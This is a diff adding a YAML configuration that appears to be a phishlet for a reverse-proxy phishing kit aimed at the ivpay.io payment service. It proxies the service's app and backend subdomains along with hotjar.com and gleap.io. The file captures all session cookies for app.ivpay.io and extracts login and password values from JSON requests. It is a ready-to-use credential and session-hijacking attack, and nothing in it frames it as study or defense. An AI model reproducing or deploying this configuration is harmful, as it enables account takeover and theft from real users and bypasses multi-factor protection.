@@ -1,0 +1,52 @@
+author: '@Evi1Grey5'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'ivpay.io', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'hotjar.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'gleap.io', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'script', orig_sub: 'script', domain: 'hotjar.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'hotjar.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'backend', orig_sub: 'backend', domain: 'ivpay.io', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ws', orig_sub: 'ws', domain: 'hotjar.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ws', orig_sub: 'ws', domain: 'gleap.io', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'app.ivpay.io', orig_sub: 'app', domain: 'ivpay.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'static.hotjar.com', orig_sub: 'static', domain: 'hotjar.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'api.gleap.io', orig_sub: 'api', domain: 'gleap.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'app.ivpay.io', orig_sub: 'api', domain: 'gleap.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'script.hotjar.com', orig_sub: 'script', domain: 'hotjar.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'app.ivpay.io', orig_sub: 'script', domain: 'hotjar.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'content.hotjar.com', orig_sub: 'content', domain: 'hotjar.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'backend.ivpay.io', orig_sub: 'backend', domain: 'ivpay.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  
+  - {triggers_on: 'ws.hotjar.com', orig_sub: 'ws', domain: 'hotjar.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'app.ivpay.io', orig_sub: 'ws', domain: 'hotjar.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'ws.gleap.io', orig_sub: 'ws', domain: 'gleap.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  
+auth_tokens:
+  - domain: 'app.ivpay.io'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/'
+  - '/user'
+
+credentials:
+  username:
+    key: ''
+    search: '"login":"([^"]*)' 
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)' 
+    type: 'json'
+
+login:
+  domain: 'app.ivpay.io'
+  path: '/login?to=/verify'
+
